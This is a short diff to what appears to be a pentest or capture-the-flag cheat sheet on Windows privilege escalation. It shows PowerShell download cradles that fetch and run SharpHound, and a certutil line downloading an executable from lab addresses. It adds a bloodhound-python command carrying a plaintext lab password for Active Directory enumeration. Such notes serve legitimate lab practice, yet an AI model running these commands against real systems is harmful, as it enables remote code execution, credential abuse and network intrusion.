@@ -65,7 +65,8 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1')
 certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1');Invoke-BloodHound (Just for .ps1)
 
-We can use BloodHound Python to PE with a normal creds If u dont have a shell
+We can use BloodHound Python to PE with a normal creds If u dont have a shell:
+bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
 ```
 
 ### Dump Hash (Generetic PE)
